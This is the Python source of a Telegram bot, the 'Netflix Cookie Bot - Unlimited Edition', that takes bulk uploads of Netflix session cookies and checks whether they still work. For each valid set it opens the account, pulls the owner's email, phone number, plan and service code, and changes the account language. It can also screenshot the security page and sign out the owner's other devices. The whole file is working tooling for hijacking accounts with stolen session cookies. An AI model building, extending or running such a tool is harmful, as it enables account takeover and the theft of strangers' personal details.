import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import os
import zipfile
import tempfile
import shutil
import json
import re
import scraper
from datetime import datetime
import asyncio

# Import bot token from config
from config import BOT_TOKEN

# Set Playwright browser path environment variable
import os
if not os.getenv('PLAYWRIGHT_BROWSERS_PATH'):
    os.environ['PLAYWRIGHT_BROWSERS_PATH'] = '/app/.cache/ms-playwright'
    print("🔧 Set PLAYWRIGHT_BROWSERS_PATH to /app/.cache/ms-playwright")

# Configure logging - LIVE DEBUG MODE
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.DEBUG
)
# Enable debug/info for specific modules
logging.getLogger('telegram').setLevel(logging.INFO)
logging.getLogger('httpx').setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

def _md_safe_inline(text: object) -> str:
    """Make dynamic text safe for Telegram Markdown inline code.
    Currently strips backticks to avoid breaking code spans.
    """
    try:
        return str(text).replace('`', "'")
    except Exception:
        return ''

def _cleanup_artifacts(aggressive: bool = False) -> None:
    """Remove debug/log artifacts from the working directory.

    aggressive=True also deletes generic .log files and any "Invalid.zip" bundles.
    """
    try:
        for fname in os.listdir('.'):
            try:
                if not os.path.isfile(fname):
                    continue
                lower = fname.lower()
                if (
                    lower.startswith('debug_') or
                    lower.startswith('nfshot_') or
                    lower.startswith('nfsecshot_') or
                    (aggressive and lower.endswith('.log')) or
                    (aggressive and lower.endswith(' invalid.zip')) or
                    (aggressive and lower.endswith('.png'))
                ):
                    os.remove(fname)
            except Exception:
                continue
        # Remove common cache dirs
        for dname in ['__pycache__']:
            try:
                if os.path.isdir(dname):
                    shutil.rmtree(dname, ignore_errors=True)
            except Exception:
                pass
    except Exception:
        pass

def parse_netflix_cookies(content):
    """Parse Netflix cookies from various formats"""
    cookies = []
    
    try:
        # Try JSON format first
        if content.strip().startswith('[') or content.strip().startswith('{'):
            json_data = json.loads(content)
            # Cases:
            # 1) [ { name, value, domain, path }, ... ]
            # 2) { cookies: [ { name, value, ... } ] }
            # 3) { name, value, ... }
            if isinstance(json_data, list):
                src = json_data
            elif isinstance(json_data, dict):
                src = json_data.get('cookies') if isinstance(json_data.get('cookies'), list) else [json_data]
            else:
                src = []
            for item in src:
                if not isinstance(item, dict):
                    continue
                name = item.get('name') or item.get('Name')
                value = item.get('value') or item.get('Value')
                domain = item.get('domain') or item.get('Domain') or '.netflix.com'
                path = item.get('path') or item.get('Path') or '/'
                if name and value:
                    cookies.append({
                        'name': str(name),
                        'value': str(value),
                        'domain': str(domain),
                        'path': str(path),
                        'secure': True,
                        'httpOnly': True
                    })
        else:
            # Try generic name=value parsing across the whole text
            try:
                pairs = re.findall(r'([^=;\s]+)\s*=\s*([^;\n\r]+)', content)
                if pairs:
                    names_lower = {n.lower() for n, _ in pairs}
                    has_netflix_keys = any(k in names_lower for k in ['netflixid', 'securenetflixid']) or any('netflix' in n for n in names_lower)
                    if has_netflix_keys:
                        for name, value in pairs:
                            if name and value:
                                cookies.append({
                                    'name': name.strip(),
                                    'value': value.strip().strip('"'),
                                    'domain': '.netflix.com',
                                    'path': '/',
                                    'secure': True,
                                    'httpOnly': True
                                })
            except Exception:
                pass

            # Also handle lines starting with Cookie: header
            if not cookies:
                for line in content.split('\n'):
                    if line.lower().startswith('cookie:'):
                        header = line.split(':', 1)[1]
                        for pair in header.split(';'):
                            if '=' in pair:
                                name, value = pair.split('=', 1)
                                name = name.strip()
                                value = value.strip()
                                if name and value:
                                    cookies.append({
                                        'name': name,
                                        'value': value,
                                        'domain': '.netflix.com',
                                        'path': '/',
                                        'secure': True,
                                        'httpOnly': True
                                    })

            # Fallback: Parse Netscape format
            if not cookies:
                lines = content.split('\n')
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#') and 'netflix.com' in line:
                        parts = line.split('\t') if '\t' in line else line.split()
                        if len(parts) >= 7:
                            domain, _, path, secure, http_only, name, value = parts[:7]
                            cookies.append({
                                'name': name,
                                'value': value,
                                'domain': domain,
                                'path': path,
                                'secure': str(secure).lower() == 'true',
                                'httpOnly': str(http_only).lower() == 'true'
                            })
    except Exception as e:
        logger.error(f"Error parsing cookies: {e}")
    
    return cookies

async def _delete_later(path: str, delay_seconds: int = 60) -> None:
    try:
        await asyncio.sleep(delay_seconds)
        if os.path.exists(path):
            os.remove(path)
    except Exception:
        pass

def _details_look_valid(details: dict | None) -> bool:
    """Heuristic to decide if scraping succeeded.
    Treat as valid if any strong field is present, not just email.
    """
    if not isinstance(details, dict):
        return False
    strong_keys = [
        'email', 'plan', 'member_since', 'package', 'profile_name', 'service_code', 'profiles_count', 'language'
    ]
    for key in strong_keys:
        val = details.get(key)
        if isinstance(val, str) and val.strip() and val.strip() != 'N/A':
            return True
    return False

def _split_cookie_text_into_sets(content: str) -> list[dict]:
    """Attempt to split a TXT content into multiple cookie sets.

    Strategy:
    - Split on blank lines into blocks
    - Accept a block if parse_netflix_cookies finds cookies (prefer blocks containing NetflixId keys)
    - If nothing splits meaningfully, return a single block
    Returns a list of dicts: {name, content}
    """
    try:
        blocks = re.split(r"\n\s*\n+", content.strip())
    except Exception:
        blocks = [content]

    valid_blocks: list[str] = []
    for blk in blocks:
        if not blk or not blk.strip():
            continue
        parsed = parse_netflix_cookies(blk)
        if parsed:
            # prefer blocks that actually include netflix keys
            names_lower = {c.get('name', '').lower() for c in parsed}
            if any(k in names_lower for k in ['netflixid', 'securenetflixid', 'nflxwxn']):
                valid_blocks.append(blk)
            else:
                # still accept generic cookie blocks
                valid_blocks.append(blk)

    if not valid_blocks:
        return [{'name': 'TXT Content', 'content': content}]

    # Merge tiny fragments: if we have many very small blocks and each has <2 pairs, join contiguous groups of 3
    merged: list[str] = []
    temp: list[str] = []
    for blk in valid_blocks:
        pairs = re.findall(r'([^=;\s]+)\s*=\s*([^;\n\r]+)', blk)
        if len(pairs) < 2:
            temp.append(blk)
            if len(temp) >= 3:
                merged.append('\n'.join(temp))
                temp = []
        else:
            if temp:
                merged.append('\n'.join(temp))
                temp = []
            merged.append(blk)
    if temp:
        merged.append('\n'.join(temp))

    result = []
    for idx, blk in enumerate(merged, start=1):
        result.append({'name': f'TXT part #{idx}', 'content': blk})
    return result

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_text = """🎬 *Netflix Cookie Bot - Unlimited Edition*

✨ *Features:*
🔄 *Auto-Process* - Instant cookie validation & details extraction
📁 *Multi-Format* - ZIP, TXT, JSON, Netscape formats supported  
🌍 *Auto-English* - Automatically changes account language to English
📊 *Complete Info* - Email, phone, plan, payment, viewing history
🚀 *No Limits* - Unlimited processing, no restrictions
⚡ *Fast Results* - Enhanced scraper with detailed account info

📤 *Send me:*
• ZIP files with Netflix cookies
• TXT files with cookie data  
• Direct cookie text/JSON

🎯 *Just send and get instant results!*

*Made by Evid*"""

    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all incoming messages"""
    try:
        if update.message.document:
            await handle_file(update, context)
        elif update.message.text:
            await handle_text(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

BATCH_SIZE = 10
MAX_INVALID_TRIES = 2

def _cleanup_session_state(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Clear in-memory state and delete local debug images."""
    try:
        _cleanup_artifacts(aggressive=True)
        # Clear user_data
        context.user_data.pop('pending_cookies', None)
        context.user_data.pop('results_meta', None)
        context.user_data.pop('force_stop', None)
    except Exception:
        pass

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads - ZIP/TXT files"""
    try:
        file = update.message.document
        file_name = file.file_name
        
        # Download file
        file_obj = await context.bot.get_file(file.file_id)
        temp_dir = tempfile.mkdtemp()
        file_path = os.path.join(temp_dir, file_name)
        await file_obj.download_to_drive(file_path)
        
        processing_msg = await update.message.reply_text("🔄 *Processing file...*", parse_mode='Markdown')
        
        cookies_data = []
        
        if file_name.lower().endswith('.zip'):
            # Handle ZIP file
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                for file_info in zip_ref.filelist:
                    if not file_info.is_dir():
                        try:
                            with zip_ref.open(file_info) as cookie_file:
                                content = cookie_file.read().decode('utf-8', errors='ignore')
                                if content.strip():
                                    cookies_data.append({
                                        'name': file_info.filename,
                                        'content': content
                                    })
                        except Exception:
                            continue
        
        elif file_name.lower().endswith('.txt'):
            # Handle TXT file
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if content.strip():
                    # Try to split into multiple sets
                    parts = _split_cookie_text_into_sets(content)
                    if len(parts) > 1:
                        # Prefix each with original filename
                        for idx, item in enumerate(parts, start=1):
                            cookies_data.append({
                                'name': f"{file_name} [#{idx}]",
                                'content': item['content']
                            })
                    else:
                        cookies_data.append({
                            'name': file_name,
                            'content': content
                        })
        
        # Clean up
        shutil.rmtree(temp_dir)
        
        if not cookies_data:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text="❌ *No valid cookie data found!*",
                parse_mode='Markdown'
            )
            return
        
        # Save pending list in user session
        context.user_data['pending_cookies'] = cookies_data
        context.user_data['force_stop'] = False
        context.user_data['results_meta'] = [{} for _ in range(len(cookies_data))]

        # Show summary with Proceed button
        total = len(cookies_data)
        summary_text = (
            f"📁 *Detected items:* {total}\n\n"
            f"Click Proceed to scrape the first {min(BATCH_SIZE, total)}."
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text=f"Proceed (1–{min(BATCH_SIZE, total)})", callback_data="proceed:0")],
            [InlineKeyboardButton(text="Cancel", callback_data="stop")]
        ])

        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg.message_id,
            text=summary_text,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ File processing error: {str(e)}")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct text input (cookies)"""
    try:
        text = update.message.text
        
        # Check if it contains Netflix-related keywords
        netflix_keywords = ['netflix.com', 'netflixid', 'securenetflixid', 'cookie', 'nftoken']
        if any(keyword in text.lower() for keyword in netflix_keywords) or text.startswith('[') or text.startswith('{'):
            processing_msg = await update.message.reply_text("🔄 *Processing cookies...*", parse_mode='Markdown')
            
            cookies_data = [{
                'name': 'Direct Input',
                'content': text
            }]
            
            await process_cookies_unlimited(update, context, cookies_data, processing_msg.message_id)
        else:
            await update.message.reply_text(
                "❓ *Send Netflix cookies in these formats:*\n"
                "• ZIP file with cookie files\n"
                "• TXT file with cookies\n"
                "• Direct cookie text/JSON\n"
                "• Text containing 'netflix.com'",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ Text processing error: {str(e)}")

async def process_cookies_unlimited(update, context, cookies_data, processing_msg_id):
    """Process all cookies with unlimited access"""
    try:
        results = []
        total_cookies = len(cookies_data)
        successful = 0
        failed = 0
        
        async def _send_result_to_user(text: str, reply_markup=None):
            """Try to send the result to user's DM; fall back to the current chat if DM is unavailable."""
            user_id = getattr(update.effective_user, 'id', None)
            if user_id is not None:
                try:
                    return await context.bot.send_message(
                        chat_id=user_id,
                        text=text,
                        parse_mode='Markdown',
                        reply_markup=reply_markup
                    )
                except Exception as dm_err:
                    logger.warning(f"DM failed, falling back to chat: {dm_err}")
            return await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )

        for i, cookie_data in enumerate(cookies_data, 1):
            # Update progress
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg_id,
                text=f"🔄 *Processing {i}/{total_cookies}:* `{_md_safe_inline(cookie_data['name'])}`",
                parse_mode='Markdown'
            )
            
            # Parse cookies
            cookies = parse_netflix_cookies(cookie_data['content'])
            
            if cookies:
                try:
                    # Headless backend scraping; no live debugging logs
                    
                    account_details = None
                    for attempt in range(1, MAX_INVALID_TRIES + 1):
                        if context.user_data.get('force_stop'):
                            break
                        account_details = await scraper.fetch_enhanced_account_details(cookies)
                        if account_details and _details_look_valid(account_details):
                            break
                    
                    if account_details and _details_look_valid(account_details):
                        logger.info("Scrape finished")
                    else:
                        logger.warning("Scrape failed - no details")
                    
                    if account_details:
                        # Format detailed response
                        response = f"""✅ *Cookie {i}: {_md_safe_inline(cookie_data['name'])} - VALID*

╭─────────── *Account Details* ───────────╮
📧 *Email:* `{_md_safe_inline(account_details['email'])}`
   └─ *Status:* {_md_safe_inline(account_details['email_verified'])}

📞 *Phone:* `{_md_safe_inline(account_details['phone_number'])}`
   └─ *Status:* {_md_safe_inline(account_details['phone_verified'])}

🎬 *Plan:* `{_md_safe_inline(account_details['plan'])}`
📅 *Member Since:* `{_md_safe_inline(account_details['member_since'])}`
📦 *Package:* `{_md_safe_inline(account_details['package'])}`
👥 *Profiles:* `{_md_safe_inline(account_details.get('profiles_count', 'N/A'))}`
👤 *Profile:* `{_md_safe_inline(account_details['profile_name'])}`
🆔 *Service Code:* `{_md_safe_inline(account_details['service_code'])}`

📺 *Last Viewed:* `{_md_safe_inline(account_details.get('last_viewed', 'Unable to fetch'))}`
🌐 *Language:* `{_md_safe_inline(account_details.get('language', 'N/A'))}`
╰────────────────────────────────────────╯

🤖 *Auto-changed to English if needed*
💡 *All details in monospace for easy copying*"""

                        # Inline buttons for each result
                        per_item_buttons = InlineKeyboardMarkup([
                            [
                                InlineKeyboardButton(text="📸 Screenshot", callback_data=f"shot:{i-1}"),
                                InlineKeyboardButton(text="🚪 Sign out", callback_data=f"signout:{i-1}")
                            ],
                            [
                                InlineKeyboardButton(text="🆔 Service code", callback_data=f"svc:{i-1}"),
                                InlineKeyboardButton(text="⛔ Force stop", callback_data="stop")
                            ]
                        ])

                        sent = await _send_result_to_user(response, reply_markup=per_item_buttons)
                        
                        successful += 1
                        results.append({'name': cookie_data['name'], 'status': 'success'})
                        # Store meta for callbacks
                        context.user_data.setdefault('results_meta', [])
                        # Ensure size
                        while len(context.user_data['results_meta']) < len(cookies_data):
                            context.user_data['results_meta'].append({})
                        context.user_data['results_meta'][i-1] = {
                            'message_id': sent.message_id,
                            'cookie_name': cookie_data['name'],
                            'service_code': account_details.get('service_code'),
                            'screenshot_path': account_details.get('screenshot_path'),
                            'cookies_raw': cookie_data['content'],
                            'email': account_details.get('email')
                        }
                    else:
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"❌ Cookie {i}: {cookie_data['name']} - INVALID/EXPIRED (checked {MAX_INVALID_TRIES}x)"
                        )
                        failed += 1
                        results.append({'name': cookie_data['name'], 'status': 'invalid'})
                        
                except Exception as e:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"❌ Cookie {i}: {cookie_data['name']} - ERROR: {str(e)}"
                    )
                    failed += 1
                    results.append({'name': cookie_data['name'], 'status': 'error'})
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Cookie {i}: {cookie_data['name']} - NO VALID COOKIES FOUND"
                )
                failed += 1
                results.append({'name': cookie_data['name'], 'status': 'no_cookies'})
        
        # Send final summary
        summary = f"""📊 *PROCESSING COMPLETE*

✅ *Valid:* {successful}
❌ *Invalid/Failed:* {failed}
📁 *Total:* {total_cookies}

⚡ *Processed at:* `{datetime.now().strftime('%H:%M:%S')}`
🚀 *No limits, unlimited access!*"""

        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg_id,
            text=summary,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg_id,
            text=f"❌ Processing error: {str(e)}"
        )

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline buttons for proceed/next and per-item actions."""
    query = update.callback_query
    try:
        await query.answer()
    except Exception:
        pass

    data = query.data or ''
    user_data = context.user_data

    if data.startswith('proceed:'):
        try:
            start = int(data.split(':', 1)[1])
        except Exception:
            start = 0
        await start_batch_processing(update, context, start, controller_msg_id=query.message.message_id)
        return

    if data.startswith('next:'):
        try:
            start = int(data.split(':', 1)[1])
        except Exception:
            start = 0
        await start_batch_processing(update, context, start, controller_msg_id=query.message.message_id)
        return

    if data == 'stop':
        user_data['force_stop'] = True
        try:
            scraper.request_abort()
        except Exception:
            pass
        _cleanup_session_state(context)
        await query.edit_message_text("⛔ Session stopped. History cleared.")
        return

    # Per-item actions
    def get_index(prefix: str) -> int | None:
        try:
            return int(data.split(':', 1)[1]) if data.startswith(prefix) else None
        except Exception:
            return None

    async def _dm_or_chat_message(text: str, reply_markup=None):
        user_id = getattr(update.effective_user, 'id', None)
        if user_id is not None:
            try:
                return await context.bot.send_message(chat_id=user_id, text=text, parse_mode='Markdown', reply_markup=reply_markup)
            except Exception as dm_err:
                try:
                    me = await context.bot.get_me()
                    bot_username = getattr(me, 'username', None)
                except Exception:
                    bot_username = None
                hint = f"\n\n➡️ Open DM with @{bot_username} and tap Start, then try again." if bot_username else ""
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Could not DM you. {text}{hint}", parse_mode='Markdown')
                return None
        return await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown', reply_markup=reply_markup)

    async def _dm_or_chat_document(path: str, caption: str | None = None):
        user_id = getattr(update.effective_user, 'id', None)
        if user_id is not None:
            try:
                return await context.bot.send_document(chat_id=user_id, document=open(path, 'rb'), filename=os.path.basename(path), caption=caption)
            except Exception as dm_err:
                try:
                    me = await context.bot.get_me()
                    bot_username = getattr(me, 'username', None)
                except Exception:
                    bot_username = None
                hint = f"\n\n➡️ Open DM with @{bot_username} and tap Start, then try again." if bot_username else ""
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Could not DM you. Sending here instead.{hint}", parse_mode='Markdown')
        return await context.bot.send_document(chat_id=update.effective_chat.id, document=open(path, 'rb'), filename=os.path.basename(path), caption=caption)

    idx = get_index('shot:')
    if idx is not None:
        # On-demand fresh screenshot of Security page for this specific cookie set
        meta = (user_data.get('results_meta') or [{}])[idx] if idx < len(user_data.get('results_meta') or []) else {}
        raw = meta.get('cookies_raw')
        if not raw:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ No cookies available for screenshot.")
            return
        try:
            cookies = parse_netflix_cookies(raw)
            email_hint = meta.get('email') if isinstance(meta, dict) else None
            shot_path = await scraper.capture_security_screenshot(cookies, width=1200, height=800, email_hint=email_hint)
            if shot_path and os.path.exists(shot_path):
                await _dm_or_chat_document(shot_path)
                asyncio.create_task(_delete_later(shot_path, 60))
            else:
                await _dm_or_chat_message("❌ Could not capture security screenshot.")
        except Exception as e:
            await _dm_or_chat_message(f"❌ Screenshot error: {e}")
        return

    idx = get_index('svc:')
    if idx is not None:
        # Fresh service code only
        meta = (user_data.get('results_meta') or [{}])[idx] if idx < len(user_data.get('results_meta') or []) else {}
        raw = meta.get('cookies_raw')
        if not raw:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ No cookies available for service code.")
            return
        try:
            cookies = parse_netflix_cookies(raw)
            code = await scraper.fetch_service_code_only(cookies)
            email = meta.get('email') or 'Email N/A'
            await _dm_or_chat_message(f"📧 {_md_safe_inline(email)}\n🆔 New Service Code: `{_md_safe_inline(code or 'N/A')}`")
        except Exception as e:
            await _dm_or_chat_message(f"❌ Service code error: {e}")
        return

    idx = get_index('signout:')
    if idx is not None:
        # Reparse cookies from stored raw for this index
        meta = (user_data.get('results_meta') or [{}])[idx] if idx < len(user_data.get('results_meta') or []) else {}
        raw = meta.get('cookies_raw')
        if not raw:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ No cookies available to sign out.")
            return
        try:
            cookies = parse_netflix_cookies(raw)
            ok = await scraper.sign_out_via_manage_devices(cookies)
            if ok:
                await _dm_or_chat_message("🚪 Signed out successfully! ✨")
            else:
                await _dm_or_chat_message("❌ Could not sign out. Try manually from Security page.")
        except Exception as e:
            await _dm_or_chat_message(f"❌ Sign out error: {e}")
        return

async def start_batch_processing(update: Update, context: ContextTypes.DEFAULT_TYPE, start: int, controller_msg_id: int):
    """Process cookies in batches of BATCH_SIZE with Next button."""
    cookies_data = context.user_data.get('pending_cookies') or []
    total = len(cookies_data)
    if total == 0:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=controller_msg_id, text="❌ Nothing to process.")
        return

    end = min(start + BATCH_SIZE, total)
    context.user_data['force_stop'] = False

    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=controller_msg_id,
        text=f"🔄 Processing {start+1}–{end} of {total}..."
    )

    # Process the slice
    slice_items = cookies_data[start:end]
    invalid_items = []
    async def _send_result_to_user(text: str, reply_markup=None):
        user_id = getattr(update.effective_user, 'id', None)
        if user_id is not None:
            try:
                return await context.bot.send_message(
                    chat_id=user_id,
                    text=text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
            except Exception as dm_err:
                logger.warning(f"DM failed, falling back to chat: {dm_err}")
        return await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

    for offset, cookie_data in enumerate(slice_items):
        if context.user_data.get('force_stop'):
            break

        step_idx = start + offset
        # Show small progress line
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⏳ {step_idx+1}/{total}: `{_md_safe_inline(cookie_data['name'])}`", parse_mode='Markdown')

        cookies = parse_netflix_cookies(cookie_data['content'])
        if not cookies:
            invalid_items.append({'name': cookie_data['name'], 'content': cookie_data['content']})
            continue

        try:
            account_details = None
            for attempt in range(1, MAX_INVALID_TRIES + 1):
                if context.user_data.get('force_stop'):
                    break
                account_details = await scraper.fetch_enhanced_account_details(cookies)
                if account_details and _details_look_valid(account_details):
                    break
            if account_details and _details_look_valid(account_details):
                response = f"""✅ *Cookie {step_idx+1}: {_md_safe_inline(cookie_data['name'])} - VALID*

╭─────────── *Account Details* ───────────╮
📧 *Email:* `{_md_safe_inline(account_details['email'])}`
   └─ *Status:* {_md_safe_inline(account_details['email_verified'])}

📞 *Phone:* `{_md_safe_inline(account_details['phone_number'])}`
   └─ *Status:* {_md_safe_inline(account_details['phone_verified'])}

🎬 *Plan:* `{_md_safe_inline(account_details['plan'])}`
📅 *Member Since:* `{_md_safe_inline(account_details['member_since'])}`
📦 *Package:* `{_md_safe_inline(account_details['package'])}`
👥 *Profiles:* `{_md_safe_inline(account_details.get('profiles_count', 'N/A'))}`
👤 *Profile:* `{_md_safe_inline(account_details['profile_name'])}`
🆔 *Service Code:* `{_md_safe_inline(account_details['service_code'])}`

📺 *Last Viewed:* `{_md_safe_inline(account_details.get('last_viewed', 'Unable to fetch'))}`
🌐 *Language:* `{_md_safe_inline(account_details.get('language', 'N/A'))}`
╰────────────────────────────────────────╯

🤖 *Auto-changed to English if needed*
💡 *All details in monospace for easy copying*"""

                per_item_buttons = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton(text="📸 Screenshot", callback_data=f"shot:{step_idx}"),
                        InlineKeyboardButton(text="🚪 Sign out", callback_data=f"signout:{step_idx}")
                    ],
                    [
                        InlineKeyboardButton(text="🆔 Service code", callback_data=f"svc:{step_idx}"),
                        InlineKeyboardButton(text="⛔ Force stop", callback_data="stop")
                    ]
                ])

                sent = await _send_result_to_user(response, reply_markup=per_item_buttons)

                # Store meta
                context.user_data.setdefault('results_meta', [])
                while len(context.user_data['results_meta']) < len(cookies_data):
                    context.user_data['results_meta'].append({})
                context.user_data['results_meta'][step_idx] = {
                    'message_id': sent.message_id,
                    'cookie_name': cookie_data['name'],
                    'service_code': account_details.get('service_code'),
                    'screenshot_path': account_details.get('screenshot_path'),
                    'cookies_raw': cookie_data['content'],
                    'email': account_details.get('email')
                }
            else:
                invalid_items.append({'name': cookie_data['name'], 'content': cookie_data['content']})
        except Exception as e:
            invalid_items.append({'name': cookie_data['name'], 'content': cookie_data.get('content', '')})

    # Controller message with Next button or Done
    if context.user_data.get('force_stop'):
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=controller_msg_id, text="⛔ Stopped.")
        return

    # Build navigation with Previous/Next
    buttons = []
    prev_start = start - BATCH_SIZE if start - BATCH_SIZE >= 0 else None
    next_start = end if end < total else None
    if prev_start is not None and next_start is not None:
        buttons.append([
            InlineKeyboardButton(text=f"⬅️ Previous {prev_start+1}–{start}", callback_data=f"next:{prev_start}"),
            InlineKeyboardButton(text=f"Next {end+1}–{min(end+BATCH_SIZE, total)} ➡️", callback_data=f"next:{end}")
        ])
    elif prev_start is not None:
        buttons.append([InlineKeyboardButton(text=f"⬅️ Previous {prev_start+1}–{start}", callback_data=f"next:{prev_start}")])
    elif next_start is not None:
        buttons.append([InlineKeyboardButton(text=f"Next {end+1}–{min(end+BATCH_SIZE, total)} ➡️", callback_data=f"next:{end}")])
    nav_markup = InlineKeyboardMarkup(buttons) if buttons else None
    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=controller_msg_id, text=f"✅ Done {start+1}–{end}.", reply_markup=nav_markup)

    # Send Invalid ZIP for this batch, if any
    if invalid_items:
        try:
            import zipfile as _zip
            import uuid as _uuid
            count = len(invalid_items)
            zip_display_name = f"{count}x Invalid.zip"
            tmp_dir = tempfile.mkdtemp()
            zip_path = os.path.join(tmp_dir, zip_display_name)
            with _zip.ZipFile(zip_path, 'w', compression=_zip.ZIP_DEFLATED) as zf:
                for item in invalid_items:
                    fname = item['name'] or 'invalid.txt'
                    fname = re.sub(r"[\\/:*?\"<>|]", "_", fname)
                    if not fname.lower().endswith('.txt'):
                        fname = f"{fname}.txt"
                    try:
                        zf.writestr(fname, item.get('content', ''))
                    except Exception:
                        zf.writestr(f"invalid_{_uuid.uuid4().hex}.txt", item.get('content', ''))
            await context.bot.send_document(chat_id=update.effective_chat.id, document=open(zip_path, 'rb'), filename=zip_display_name, caption=f"{count} invalid cookies in this batch")
        except Exception:
            pass
        finally:
            try:
                shutil.rmtree(tmp_dir)
            except Exception:
                pass

    # Light cleanup of artifacts after finishing a batch
    _cleanup_artifacts(aggressive=False)

def main():
    """Start the bot"""
    # Clean artifacts at startup for server/GitHub hygiene
    _cleanup_artifacts(aggressive=True)
    
    # Add unique identifier to prevent conflicts
    import uuid
    instance_id = str(uuid.uuid4())[:8]
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add only essential handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_message))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(on_button))
    
    # Start the bot with unique identifier
    print("🚀 Netflix Cookie Bot - Unlimited Edition Starting...")
    print(f"🆔 Instance ID: {instance_id}")
    print("✨ No limits, no buttons, no restrictions!")
    print("📝 Send Netflix cookies to get instant results!")
    
    try:
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,  # Drop any pending updates to avoid conflicts
            close_loop=False
        )
    except Exception as e:
        logger.error(f"Bot startup error: {e}")
        raise
    
if __name__ == '__main__':
    main()
